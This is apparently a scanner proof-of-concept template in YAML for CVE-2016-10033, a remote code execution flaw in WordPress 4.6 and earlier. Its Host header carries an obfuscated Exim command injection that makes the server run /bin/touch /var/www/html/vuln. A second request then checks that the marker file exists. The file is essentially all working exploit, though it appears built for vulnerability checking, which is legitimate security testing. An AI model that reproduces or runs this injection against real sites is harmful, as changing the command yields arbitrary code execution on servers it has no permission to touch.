name: poc-yaml-wordpress-upload-rce
rules:
  - method: POST
    path: /wp-login.php?action=lostpassword
    follow_redirects: true
    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}vuln}} null)
    body: 
      user_login=admin&redirect_to=&wp-submit=Get+New+Password
    expression:
        response.status == 302
  - method: GET
    path: /vuln
    expression:
        response.status == 200
detail:
      Author: elliot
      CVEINFO: CVE-2016-10033
      Affected Version: "WordPress <= 4.6"
      links:
        - http://vulapps.evalbug.com/w_wordpress_6/